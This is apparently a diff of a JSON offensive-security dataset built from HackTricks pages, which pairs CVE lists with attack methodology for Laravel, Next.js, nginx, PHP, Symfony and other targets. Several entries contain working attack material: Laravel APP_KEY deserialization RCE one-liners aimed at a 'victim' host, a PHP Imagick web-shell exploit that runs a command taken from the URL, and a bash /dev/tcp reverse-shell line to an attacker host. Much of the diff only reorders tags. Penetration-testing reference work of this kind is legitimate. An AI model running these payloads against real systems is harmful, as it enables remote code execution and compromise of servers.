   "methodology": "## Laravel SQLInjection\nRead information about this here: [https://stitcher.io/blog/unsafe-sql-functions-in-laravel](https://stitcher.io/blog/unsafe-sql-functions-in-laravel)\n\n---\n\n## APP_KEY & Encryption internals (Laravel >=5.6)\nLaravel uses AES-256-CBC (or GCM) with HMAC integrity under the hood (`Illuminate\\Encryption\\Encrypter`).\nThe raw ciphertext that is finally **sent to the client** is **Base64 of a JSON object** like:\n\n```json\n{\n  \"iv\"   : \"Base64(random 16-byte IV)\",\n  \"value\": \"Base64(ciphertext)\",\n  \"mac\"  : \"HMAC_SHA256(iv||value, APP_KEY)\",\n  \"tag\"  : \"\"                 // only used for AEAD ciphers (GCM)\n}\n```\n\n`encrypt($value, $serialize=true)` will `serialize()` the plaintext by default, whereas\n`decrypt($payload, $unserialize=true)` **will automatically `unserialize()`** the decrypted value.\nTherefore **any attacker that knows the 32-byte secret `APP_KEY` can craft an encrypted PHP serialized object and gain RCE via magic methods (`__wakeup`, `__destruct`, …)**.\n\nMinimal PoC (framework ≥9.x):\n```php\nuse Illuminate\\Support\\Facades\\Crypt;\n\n$chain = base64_decode('<phpggc-payload>'); // e.g. phpggc Laravel/RCE13 system id -b -f\n$evil  = Crypt::encrypt($chain);            // JSON->Base64 cipher re\n\n## laravel-crypto-killer 🧨\n[laravel-crypto-killer](https://github.com/synacktiv/laravel-crypto-killer) automates the whole process and adds a convenient **bruteforce** mode:\n\n```bash\n\n## Encrypt a phpggc chain with a known APP_KEY\nlaravel_crypto_killer.py encrypt -k \"base64:<APP_KEY>\" -v \"$(phpggc Laravel/RCE13 system id -b -f)\"\n\n## Decrypt a captured cookie / token\nlaravel_crypto_killer.py decrypt -k <APP_KEY> -v <cipher>\n\n## Try a word-list of keys against a token (offline)\nlaravel_crypto_killer.py bruteforce -v <cipher> -kf appkeys.txt\n```\n\nThe script transparently supports both CBC and GCM payloads and re-generates the HMAC/tag field.\n\n---\n\n## Real-world vulnerable patterns\n| Project | Vulnerable sink | Gadget chain |\n|---------|-----------------|--------------|\n| Invoice Ninja ≤v5 (CVE-2024-55555) | `/route/{hash}` → `decrypt($hash)` | Laravel/RCE13 |\n| Snipe-IT ≤v6 (CVE-2024-48987) | `XSRF-TOKEN` cookie when `Passport::withCookieSerialization()` is enabled | Laravel/RCE9 |\n| Crater  (CVE-2024-55556) | `SESSION_DRIVER=cookie` → `laravel_session` cookie | Laravel/RCE15 |\n\nThe exploitation workflow is always:\n1. Obtain or brute-force the 32-byte `APP_KEY`.\n2. Build a gadget chain with **PHPGGC** (for example `Laravel/RCE13`, `Laravel/RCE9` or `Laravel/RCE15`).\n3. Encrypt the serialized gadget with **laravel_crypto_killer.py** and the recovered `APP_KEY`.\n4. Deliver the ciphertext to the vulnerable `decrypt()` sink (route parameter, cookie, session …) to trigger **RCE**.\n\nBelow are concise one-liners demonstrating the full attack path for each real-world CVE mentioned above:\n\n```bash\n\n## Invoice Ninja ≤5 – /route/{hash}\nphp8.2 phpggc Laravel/RCE13 system id -b -f | \\\n  ./laravel_crypto_killer.py encrypt -k <APP_KEY> -v - | \\\n  xargs -I% curl \"https://victim/route/%\"\n\n## Snipe-IT ≤6 – XSRF-TOKEN cookie\nphp7.4 phpggc Laravel/RCE9 system id -b | \\\n  ./laravel_crypto_killer.py encrypt -k <APP_KEY> -v - > xsrf.txt\ncurl -H \"Cookie: XSRF-TOKEN=$(cat xsrf.txt)\" https://victim/login\n\n## Crater – cookie-based session\nphp8.2 phpggc Laravel/RCE15 system id -b > payload.bin\n./laravel_crypto_killer.py encrypt -k <APP_KEY> -v payload.bin --session_cookie=<orig_hash> > forged.txt\ncurl -H \"Cookie: laravel_session=<orig>; <cookie_name>=$(cat forged.txt)\" https://victim/login\n```",
@@ -18227,8 +18227,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "laravel",
-   "0"
+   "0",
+   "laravel"
   ]
  },
  {
@@ -18275,12 +18275,12 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-49706",
-   "cve-2025-49706",
    "CVE-2025-49704",
+   "CVE-2025-49706",
    "cve-2025-53770",
-   "CVE-2025-53770",
    "CVE-2025-53771",
+   "cve-2025-49706",
+   "CVE-2025-53770",
    "cve-2025-49704"
   ],
   "privilege_escalation": [],
@@ -18289,8 +18289,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "microsoft sharepoint",
-   "0"
+   "0",
+   "microsoft sharepoint"
   ]
  },
  {
@@ -18748,12 +18748,12 @@
   ],
   "common_vulnerabilities": [
    "CVE-2025-49005",
+   "CVE-2025-55184",
+   "CVE-2025-55183",
+   "CVE-2025-67779",
    "CVE-2025-66478",
    "CVE-2025-55182",
-   "CVE-2025-67779",
-   "CVE-2025-55183",
-   "CVE-2025-29927",
-   "CVE-2025-55184"
+   "CVE-2025-29927"
   ],
   "privilege_escalation": [],
   "methodology": "## Typical File Structure\nA standard Next.js project follows a specific file and directory structure that facilitates its features like routing, API endpoints, and static asset management. Here's a typical layout:\n\n```lua\nmy-nextjs-app/\n├── node_modules/\n├── public/\n│   ├── images/\n│   │   └── logo.png\n│   └── favicon.ico\n├── app/\n│   ├── api/\n│   │   └── hello/\n│   │       └── route.ts\n│   ├── layout.tsx\n│   ├── page.tsx\n│   ├── about/\n│   │   └── page.tsx\n│   ├── dashboard/\n│   │   ├── layout.tsx\n│   │   └── page.tsx\n│   ├── components/\n│   │   ├── Header.tsx\n│   │   └── Footer.tsx\n│   ├── styles/\n│   │   ├── globals.css\n│   │   └── Home.module.css\n│   └── utils/\n│       └── api.ts\n├── .env.local\n├── next.config.js\n├── tsconfig.json\n├── package.json\n├── README.md\n└── yarn.lock / package-lock.json\n\n```\n\n## Core Directories and Files\n- **public/:** Hosts static assets such as images, fonts, and other files. Files here are accessible at the root path (`/`).\n- **app/:** Central directory for your application’s pages, layouts, components, and API routes. Embraces the **App Router** paradigm, enabling advanced routing features and server-client component segregation.\n- **app/layout.tsx:** Defines the root layout for your application, wrapping around all pages and providing consistent UI elements like headers, footers, and navigation bars.\n- **app/page.tsx:** Serves as the entry point for the root route `/`, rendering the home page.\n- **app/[route]/page.tsx:** Handles static and dynamic routes. Each folder within `app/` represents a route segment, and `page.tsx` within those folders corresponds to the route's component.\n- **app/api/:** Contains API routes, allowing you to create serverless functions that handle HTTP requests. These routes replace the traditional `pages/api` directory.\n- **app/components/:** Houses reusa\n\n## File-Based Routing in the `app` Directory\nThe `app` directory is the cornerstone of routing in the latest Next.js versions. It leverages the filesystem to define routes, making route management intuitive and scalable.\n\n<details>\n\n<summary>Handling the Root Path /</summary>\n\n**File Structure:**\n\n```arduino\nmy-nextjs-app/\n├── app/\n│   ├── layout.tsx\n│   └── page.tsx\n├── public/\n├── next.config.js\n└── ...\n```\n\n**Key Files:**\n\n- **`app/page.tsx`**: Handles requests to the root path `/`.\n- **`app/layout.tsx`**: Defines the layout for the application, wrapping around all pages.\n\n**Implementation:**\n\n```tsx\ntsxCopy code// app/page.tsx\n\nexport default function HomePage() {\n  return (\n    <div>\n      <h1>Welcome to the Home Page!</h1>\n      <p>This is the root route.</p>\n    </div>\n  );\n}\n```\n\n**Explanation:**\n\n- **Route Definition:** The `page.tsx` file directly under the `app` directory corresponds to the `/` route.\n- **Rendering:** This component renders the content for the home page.\n- **Layout Integration:** The `HomePage` compone\n\n## Potential Client-Side Vulnerabilities\nWhile Next.js provides a secure foundation, improper coding practices can introduce vulnerabilities. Key client-side vulnerabilities include:\n\n<details>\n\n<summary>Cross-Site Scripting (XSS)</summary>\n\nXSS attacks occur when malicious scripts are injected into trusted websites. Attackers can execute scripts in users' browsers, stealing data or performing actions on behalf of the user.\n\n**Example of Vulnerable Code:**\n\n```jsx\n// Dangerous: Injecting user input directly into HTML\nfunction Comment({ userInput }) {\n  return <div dangerouslySetInnerHTML={{ __html: userInput }} />\n}\n```\n\n**Why It's Vulnerable:** Using `dangerouslySetInnerHTML` with untrusted input allows attackers to inject malicious scripts.\n\n</details>\n\n<details>\n\n<summary>Client-Side Template Injection</summary>\n\nOccurs when user inputs are improperly handled in templates, allowing attackers to inject and execute templates or expressions.\n\n**Example of Vulnerable Code:**\n\n```jsx\nimport React from \"react\"\nimport ejs from \"e\n\n## Attack Scenario\n1. **Attacker's Objective**: Perform a CSRF attack to delete a critical file (e.g., `admin/config.json`) by manipulating the `filePath`.\n2. **Exploiting CSPT**:\n   - **Malicious Input**: The attacker crafts a URL with a manipulated `filePath` such as `../deleteFile/config.json`.\n   - **Resulting API Call**: The client-side code makes a request to `/api/files/../deleteFile/config.json`.\n   - **Server's Handling**: If the server does not validate the `filePath`, it processes the request, potentially deleting or exposing sensitive files.\n3. **Executing CSRF**:\n   - **Crafted Link**: The attacker sends the victim a link or embeds a malicious script that triggers the download request with the manipulated `filePath`.\n   - **Outcome**: The victim unknowingly executes the action, leading to unauthorized file access or deletion.\n\n## Why It's Vulnerable\n- **Lack of Input Validation**: The client-side allows arbitrary `filePath` inputs, enabling path traversal.\n- **Trusting Client Inputs**: The server-side API trusts and processes the `fi",
@@ -19069,12 +19069,12 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
+   "CVE-2024-34161",
    "CVE-2024-35200",
    "CVE-2025-23419",
-   "CVE-2024-31079",
-   "CVE-2023-44487",
    "CVE-2024-32760",
-   "CVE-2024-34161"
+   "CVE-2023-44487",
+   "CVE-2024-31079"
   ],
   "privilege_escalation": [],
   "methodology": "## Missing root location <a href=\"#missing-root-location\" id=\"missing-root-location\"></a>\nWhen configuring the Nginx server, the **root directive** plays a critical role by defining the base directory from which files are served. Consider the example below:\n\n```bash\nserver {\n        root /etc/nginx;\n\n        location /hello.txt {\n                try_files $uri $uri/ =404;\n                proxy_pass http://127.0.0.1:8080/;\n        }\n}\n```\n\nIn this configuration, `/etc/nginx` is designated as the root directory. This setup allows access to files within the specified root directory, such as `/hello.txt`. However, it's crucial to note that only a specific location (`/hello.txt`) is defined. There's no configuration for the root location (`location / {...}`). This omission means that the root directive applies globally, enabling requests to the root path `/` to access files under `/etc/nginx`.\n\nA critical security consideration arises from this configuration. A simple `GET` request, like `GET /nginx.conf`, could expose sensitive information by serving the Nginx configuration fil\n\n## Alias LFI Misconfiguration <a href=\"#alias-lfi-misconfiguration\" id=\"alias-lfi-misconfiguration\"></a>\nIn the configuration files of Nginx, a close inspection is warranted for the \"location\" directives. A vulnerability known as Local File Inclusion (LFI) can be inadvertently introduced through a configuration that resembles the following:\n\n```\nlocation /imgs {\n    alias /path/images/;\n}\n```\n\nThis configuration is prone to LFI attacks due to the server interpreting requests like `/imgs../flag.txt` as an attempt to access files outside the intended directory, effectively resolving to `/path/images/../flag.txt`. This flaw allows attackers to retrieve files from the server's filesystem that should not be accessible via the web.\n\nTo mitigate this vulnerability, the configuration should be adjusted to:\n\n```\nlocation /imgs/ {\n    alias /path/images/;\n}\n```\n\nMore info: [https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/)\n\nAccunetix tests:\n\n```\nalias../ => HTTP stat\n\n## Unsafe path restriction <a href=\"#unsafe-variable-use\" id=\"unsafe-variable-use\"></a>\nCheck the following page to learn how to bypass directives like:\n\n```plaintext\nlocation = /admin {\n    deny all;\n}\n\nlocation = /admin/ {\n    deny all;\n}\n```\n\n\n{{#ref}}\n../../pentesting-web/proxy-waf-protections-bypass.md\n{{#endref}}\n\n## Unsafe variable use / HTTP Request Splitting <a href=\"#unsafe-variable-use\" id=\"unsafe-variable-use\"></a>\n> [!CAUTION]\n> Vulnerable variables `$uri` and `$document_ur`i and this can be fixed by replacing them with `$request_uri`.\n>\n> A regex can also be vulnerable like:\n>\n> `location ~ /docs/([^/])? { … $1 … }` - Vulnerable\n>\n> `location ~ /docs/([^/\\s])? { … $1 … }` - Not vulnerable (checking spaces)\n>\n> `location ~ /docs/(.*)? { … $1 … }` - Not vulnerable\n\nA vulnerability in Nginx configuration is demonstrated by the example below:\n\n```\nlocation / {\n  return 302 https://example.com$uri;\n}\n```\n\nThe characters \\r (Carriage Return) and \\n (Line Feed) signify new line characters in HTTP requests, and their URL-encoded forms are represented as `%0d%0a`. Including these characters in a request (e.g., `http://localhost/%0d%0aDetectify:%20clrf`) to a misconfigured server results in the server issuing a new header named `Detectify`. This happens because the $uri variable decodes the URL-encoded new line characters, leading to an unexpected header in the response:\n\n```\nHTTP/1.1 302 Moved Temporari\n\n## Any variable\nIt was discovered that **user-supplied data** might be treated as an **Nginx variable** under certain circumstances. The cause of this behavior remains somewhat elusive, yet it's not rare nor straightforward to verify. This anomaly was highlighted in a security report on HackerOne, which can be viewed [here](https://hackerone.com/reports/370094). Further investigation into the error message led to the identification of its occurrence within the [SSI filter module of Nginx's codebase](https://github.com/nginx/nginx/blob/2187586207e1465d289ae64cedc829719a048a39/src/http/modules/ngx_http_ssi_filter_module.c#L365), pinpointing Server Side Includes (SSI) as the root cause.\n\nTo **detect this misconfiguration**, the following command can be executed, which involves setting a referer header to test for variable printing:\n\n```bash\n$ curl -H ‘Referer: bar’ http://localhost/foo$http_referer | grep ‘foobar’\n```\n\nScans for this misconfiguration across systems revealed multiple instances where Nginx\n\n## Using try_files with $URI$ARGS variables\nFollowing Nginx misconfiguration can lead to an LFI vulnerability:\n```\nlocation / {\n\t\ttry_files $uri$args $uri$args/ /index.html;\n}\n```\nIn our configuration we have directive `try_files` which is used to check for existence of files in specified order. Nginx will server the first one that it will find. Th",
@@ -19083,8 +19083,8 @@
   "source": "hacktricks",
   "tags": [
    "0",
-   "post/cors-playground),",
-   "nginx"
+   "nginx",
+   "post/cors-playground),"
   ]
  },
  {
@@ -19129,8 +19129,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "nodejs express",
-   "0"
+   "0",
+   "nodejs express"
   ]
  },
  {
@@ -19201,8 +19201,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "perl tricks",
-   "0"
+   "0",
+   "perl tricks"
   ]
  },
  {
@@ -19456,10 +19456,10 @@
    }
   ],
   "common_vulnerabilities": [
-   "cve-2023-36844",
    "cve-2023-36845",
-   "CVE-2024-4577",
-   "cve-2024-4577"
+   "cve-2024-4577",
+   "cve-2023-36844",
+   "CVE-2024-4577"
   ],
   "privilege_escalation": [],
   "methodology": "## PHP Tricks\n{{#include ../../../banners/hacktricks-training.md}}\n\n## Cookies common location:\nThis is also valid for phpMyAdmin cookies.\n\nCookies:\n\n```\nPHPSESSID\nphpMyAdmin\n```\n\nLocations:\n\n```\n/var/lib/php/sessions\n/var/lib/php5/\n/tmp/\nExample: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e\n```\n\n## Loose comparisons/Type Juggling ( == )\nIf `==` is used in PHP, then there are unexpected cases where the comparison doesn't behave as expected. This is because \"==\" only compare values transformed to the same type, if you also want to compare that the type of the compared data is the same you need to use `===`.\n\nPHP comparison tables: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)\n\n![](<../../../images/image (567).png>)\n\n{{#file}}\nEN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf\n{{#endfile}}\n\n- `\"string\" == 0 -> True` A string which doesn't start with a number is equals to a number\n- `\"0xAAAA\" == \"43690\" -> True` Strings composed by numbers in dec or hex format can be compare to other numbers/strings with True as result if the numbers were the same (numbers in a string are interpreted as numbers)\n- `\"0e3264578\" == 0 --> True` A string starting with \"0e\" and followed by anything will be equals to 0\n- `\"0X3264578\" == 0X --> True` A string starting with \"0\" and fol\n\n## **in_array()**\n**Type Juggling** also affects to the `in_array()` function by default (you need to set to true the third argument to make an strict comparison):\n\n```php\n$values = array(\"apple\",\"orange\",\"pear\",\"grape\");\nvar_dump(in_array(0, $values));\n//True\nvar_dump(in_array(0, $values, true));\n//False\n```\n\n## strcmp()/strcasecmp()\nIf this function is used for **any authentication check** (like checking the password) and the user controls one side of the comparison, he can send an empty array instead of a string as the value of the password (`https://example.com/login.php/?username=admin&password[]=`) and bypass this check:\n\n```php\nif (!strcmp(\"real_pwd\",\"real_pwd\")) { echo \"Real Password\"; } else { echo \"No Real Password\"; }\n// Real Password\nif (!strcmp(array(),\"real_pwd\")) { echo \"Real Password\"; } else { echo \"No Real Password\"; }\n// Real Password\n```\n\nThe same error occurs with `strcasecmp()`\n\n## Strict type Juggling\nEven if `===` is **being used** there could be errors that makes the **comparison vulnerable** to **type juggling**. For example, if the comparison is **converting the data to a different type of object before comparing**:\n\n```php\n(int) \"1abc\" === (int) \"1xyz\" //This will be true\n```\n\n## preg_match(/^.\\*/)\n**`preg_match()`** could be used to **validate user input** (it **checks** if any **word/regex** from a **blacklist** is **present** on the **user input** and if it's not, the code can continue it's execution).\n\n## New line bypass\nHowever, when delimiting the start of the regexp`preg_match()` **only checks the first line of the user input**, then if somehow you can **send** the input in **several lines**, you could be able to bypass this check. Example:\n\n```php\n$myinput=\"aaaaaaa\n11111111\"; //Notice the new line\necho preg_match(\"/1/\",$myinput);\n//1  --> In this scenario preg_match find the char \"1\"\necho preg_match(\"/1.*$/\",$myinput);\n//1  --> In this scenario preg_match find the char \"1\"\necho preg_match(\"/^.*1/\",$myinput);\n//0  --> In this scenario preg_match DOESN'T find the char \"1\"\necho preg_match(\"/^.*1.*$/\",$myinput);\n//0  --> In this scenario preg_match DOESN'T find the char \"1\"\n```\n\nTo bypass this check you could **send the value with new-lines urlencoded** (`%0A`) or if you can send **JSON data**, send it in **several lines**:\n\n```php\n{\n  \"cmd\": \"cat /etc/passwd\"\n}\n```\n\nFind an example here: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)\n\n## **Length error bypass**\n(This bypass was tried apparently on PHP 5.2.5 and I couldn't make it work on PHP 7.3.15)\\\nIf you can send to `preg_match()` a valid very **large input**, it **won't be able to process it** and you will be able to **bypass** the check. For example, if it is blacklisting a JSON you could send:\n\n```bash\npayload = '{\"cmd\": \"ls -la\", \"injected\": \"'+ \"a\"*1000001 + '\"}'\n```\n\nFrom: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)\n\n## ReDoS Bypass\nTrick from: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) and [https://mizu.re/post/pong](https://mizu.re/post/pong)\n\n<figure><img src=\"../../../images/image (26).png\" alt=\"\"><figcaption></figcaption></figure>\n\nIn short the problem happens because the `preg_*` functions in PHP builds upon the [PCRE library](http://www.pcre.org/). In PCRE certain regular expressions are matched by using a lot of recursive c",
@@ -19468,8 +19468,8 @@
   "source": "hacktricks",
   "tags": [
    "0",
-   "post/pong](https://mizu.re/post/pong)",
-   "readme"
+   "readme",
+   "post/pong](https://mizu.re/post/pong)"
   ]
  },
  {
@@ -19537,8 +19537,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "php ssrf",
-   "0"
+   "0",
+   "php ssrf"
   ]
  },
  {
@@ -19643,8 +19643,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "disable functions bypass dl function",
-   "0"
+   "0",
+   "disable functions bypass dl function"
   ]
  },
  {
@@ -19657,8 +19657,8 @@
   "exploitation_commands": [],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2016-3714",
-   "CVE-2020-29599"
+   "CVE-2020-29599",
+   "CVE-2016-3714"
   ],
   "privilege_escalation": [],
   "methodology": "## Imagick <= 3.3.0  ‑ PHP >= 5.4  *disable_functions* Bypass\n{{#include ../../../../banners/hacktricks-training.md}}\n\n> The well-known *ImageTragick* family of bugs (CVE-2016-3714 et al.) allows an attacker to reach the underlying **ImageMagick** binary through crafted MVG/SVG input. When the PHP extension **Imagick** is present this can be abused to execute shell commands even if every execution-oriented PHP function is black-listed with `disable_functions`.\n>\n> The original PoC published by RicterZ (Chaitin Security Research Lab) in May 2016 is reproduced below.  The technique is still regularly encountered during contemporary PHP 7/8 audits because many shared-hosting providers  simply compile PHP without `exec`/`system` but keep an outdated Imagick + ImageMagick combo.\n\nFrom <http://blog.safebuff.com/2016/05/06/disable-functions-bypass/>\n\n```php\n\n## Usage         : curl \"http://target/exploit.php?cmd=id\"\n<?php\n// Print the local hardening status\nprintf(\"Disable functions: %s\\n\", ini_get(\"disable_functions\"));\n$cmd = $_GET['cmd'] ?? 'id';\nprintf(\"Run command: %s\\n====================\\n\", $cmd);\n\n$tmp   = tempnam('/tmp', 'pwn');     // will hold command output\n$mvgs  = tempnam('/tmp', 'img');     // will hold malicious MVG script\n\n$payload = <<<EOF\npush graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/x.jpg\"|$cmd >$tmp\")'\npop graphic-context\nEOF;\n\nfile_put_contents($mvgs, $payload);\n$img = new Imagick();\n$img->readImage($mvgs);     // triggers convert(1)\n$img->writeImage(tempnam('/tmp', 'img'));\n$img->destroy();\n\necho file_get_contents($tmp);\n?>\n```\n\n---\n\n## Why does it work?\n1. `Imagick::readImage()` transparently spawns the **ImageMagick** *delegate* (`convert`/`magick`) binary.\n2. The MVG script sets the *fill* to an external URI.  When a double quote (`\"`) is injected, the remainder of the line is interpreted by `/bin/sh ‑c`  that ImageMagick uses internally → arbitrary shell execution.\n3. All happens outside of the PHP interpreter, therefore *`disable_functions`*, *open_basedir*, `safe_mode` (removed in PHP 5.4) and similar in-process restrictions are completely bypassed.\n\n## 2025 status – it is **still** relevant\n* Any Imagick version that relies on a vulnerable ImageMagick backend remains exploitable.  In lab tests the same payload works on PHP 8.3 with **Imagick 3.7.0** and **ImageMagick 7.1.0-51** compiled without a hardened `policy.xml`.\n* Since 2020 several additional command-injection vectors have been found (`video:pixel-format`, `ps:`, `text:` coders…).  Two recent public examples are:\n  * **CVE-2020-29599** – shell injection via the *text:* coder.\n  * **GitHub issue #6338** (2023) – injection in the *video:* delegate.\n\nIf the operating system ships ImageMagick < **7.1.1-11** (or 6.x < **6.9.12-73**) without a restrictive policy file, exploitation is straightforward.\n\n## Modern payload variants\n```php\n// --- Variant using the video coder discovered in 2023 ---\n$exp = <<<MAGICK\npush graphic-context\nimage over 0,0 0,0 'vid:dummy.mov\" -define video:pixel-format=\"rgba`uname -a > /tmp/pwned`\" \" dummy'\npop graphic-context\nMAGICK;\n$img = new Imagick();\n$img->readImageBlob($exp);\n```\n\nOther useful primitives during CTFs / real engagements:\n\n* **File write**  – `... > /var/www/html/shell.php`  (write web-shell outside *open_basedir*)\n* **Reverse shell** – `bash -c \"bash -i >& /dev/tcp/attacker/4444 0>&1\"`\n* **Enumerate** – `id; uname -a; cat /etc/passwd`\n\n## PHP side\nphp -r 'echo phpversion(), \"\\n\"; echo Imagick::getVersion()[\"versionString\"], \"\\n\";'\n\n## System side\nconvert -version | head -1                 # ImageMagick version\nconvert -list policy | grep -iE 'mvg|https|video|text'   # dangerous coders still enabled?\n```\n\nIf the output shows the `MVG` or `URL` coders are *enabled* the target is probably exploitable.\n\n## Mitigations\n1. **Patch/Upgrade**  – Use ImageMagick ≥ *7.1.1-11* (or the latest 6.x LTS) and Imagick ≥ *3.7.2*.\n2. **Harden `policy.xml`**  – explicitly *disable* high-risk coders:\n\n   ```xml\n   <policy domain=\"coder\" name=\"MVG\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"MSL\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"URL\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"VIDEO\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"PS\" rights=\"none\"/>\n   <policy domain=\"coder\" name=\"TEXT\" rights=\"none\"/>\n   ```\n\n3. **Remove the extension**  on untrusted hosting environments.  In most web stacks `GD` or `Imagick` is not strictly required.\n4. Treat `disable_functions` only as *defence-in-depth* – never as a primary sandboxing mechanism.\n\n## References\n* [GitHub ImageMagick issue #6338 – Command injection via video:pixel-format (2023)](https://github.com/ImageMagick/ImageMagick/issues/6338)\n* [CVE-2020-29599 – ImageMagick shell injection via text: coder](https://nvd.nist.gov/vuln/detail/CVE-2020-29599)\n{{#include ../../../../banners/hacktricks-training.md}}",
@@ -19706,8 +19706,8 @@
   "kill_chain_phase": "GENERAL",
   "source": "hacktricks",
   "tags": [
-   "disable functions bypass php 4 greater than 4.2.0 php 5 pcntl exec",
-   "0"
+   "0",
+   "disable functions bypass php 4 greater than 4.2.0 php 5 pcntl exec"
   ]
  },
  {
@@ -19746,8 +19746,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "disable functions bypass php 5.2.3 win32std ext protections bypass",
-   "0"
+   "0",
+   "disable functions bypass php 5.2.3 win32std ext protections bypass"
   ]
  },
  {
@@ -19789,8 +19789,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "disable functions bypass php 7.0 7.4 nix only",
-   "0"
+   "0",
+   "disable functions bypass php 7.0 7.4 nix only"
   ]
  },
  {
@@ -19906,8 +19906,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "0",
-   "disable functions bypass via mem"
+   "disable functions bypass via mem",
+   "0"
   ]
  },
  {
@@ -19926,8 +19926,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "disable functions php 5.2.4 ioncube extension exploit",
-   "0"
+   "0",
+   "disable functions php 5.2.4 ioncube extension exploit"
   ]
  },
  {
@@ -20084,8 +20084,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "put method webdav",
-   "0"
+   "0",
+   "put method webdav"
   ]
  },
  {
@@ -20130,8 +20130,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "rocket chat",
-   "0"
+   "0",
+   "rocket chat"
   ]
  },
  {
@@ -20205,8 +20205,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "roundcube",
-   "0"
+   "0",
+   "roundcube"
   ]
  },
  {
@@ -20338,15 +20338,15 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-27610",
-   "cve-2025-24293",
-   "cve-2024-46986",
-   "CVE-2024-49761",
-   "CVE-2025-24293",
-   "cve-2024-25126",
-   "CVE-2025-27219",
    "CVE-2025-27220",
    "CVE-2025-57821",
+   "cve-2025-24293",
+   "CVE-2025-24293",
+   "CVE-2025-27610",
+   "CVE-2025-27219",
+   "CVE-2024-49761",
+   "cve-2024-25126",
+   "cve-2024-46986",
    "CVE-2024-25126"
   ],
   "privilege_escalation": [],
@@ -20355,8 +20355,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "ruby tricks",
-   "0"
+   "0",
+   "ruby tricks"
   ]
  },
  {
@@ -20482,8 +20482,8 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2025-53693",
    "CVE-2025-53694",
+   "CVE-2025-53693",
    "CVE-2025-53691"
   ],
   "privilege_escalation": [],
@@ -20590,8 +20590,8 @@
   "kill_chain_phase": "EXPLOITATION",
   "source": "hacktricks",
   "tags": [
-   "special http headers",
-   "0"
+   "0",
+   "special http headers"
   ]
  },
  {
@@ -20610,8 +20610,8 @@
   "kill_chain_phase": "ENUMERATION",
   "source": "hacktricks",
   "tags": [
-   "spring actuators",
-   "0"
+   "0",
+   "spring actuators"
   ]
  },
  {
@@ -20680,19 +20680,19 @@
   ],
   "default_credentials": [],
   "common_vulnerabilities": [
-   "CVE-2024-50345",
-   "CVE-2017-9841",
-   "CVE-2024-51736",
-   "cve-2024-51736",
-   "cve-2025-47946",
-   "CVE-2025-47946",
-   "CVE-2025-64500",
-   "cve-2026-24739",
-   "CVE-2023-46734",
-   "CVE-2019-18889",
-   "CVE-2026-24739",
    "CVE-2023-46733",
-   "CVE-2024-50340"
+   "CVE-2025-64500",
+   "CVE-2019-18889",
+   "cve-2024-51736",
+   "CVE-2024-50345",
+   "CVE-2026-24739",
+   "CVE-2025-47946",
+   "CVE-2024-50340",
+   "CVE-2024-51736",
+   "CVE-2023-46734",
+   "cve-2026-24739",
+   "CVE-2017-9841",
+   "cve-2025-47946"
   ],
   "privilege_escalation": [],
   "methodology": "## Symfony\n{{#include ../../banners/hacktricks-training.md}}\n\nSymfony is one of the most widely-used PHP frameworks and regularly appears in assessments of enterprise, e-commerce and CMS targets (Drupal, Shopware, Ibexa, OroCRM … all embed Symfony components).  This page collects offensive tips, common mis-configurations and recent vulnerabilities you should have on your checklist when you discover a Symfony application.\n\n> Historical note: A large part of the ecosystem still runs the **5.4 LTS** branch (EOL **November 2025**).  Symfony **7.4** became the new LTS in **Nov 2025** and will receive security fixes until **Nov 2029**.  Always verify the exact patch-level because many 2024‑2026 advisories were fixed only in micro releases.\n\n---\n\n## Finger-printing\n* HTTP response headers: `X-Powered-By: Symfony`, `X-Debug-Token`, `X-Debug-Token-Link` or cookies starting with `sf_redirect`, `sf_session`, `MOCKSESSID`.\n* Source code leaks (`composer.json`, `composer.lock`, `/vendor/…`) often reveal the exact version:\n  ```bash\n  curl -s https://target/vendor/composer/installed.json | jq '.[] | select(.name|test(\"symfony/\")) | .name,.version'\n  ```\n* Public routes that only exist on Symfony:\n  * `/_profiler`   (Symfony 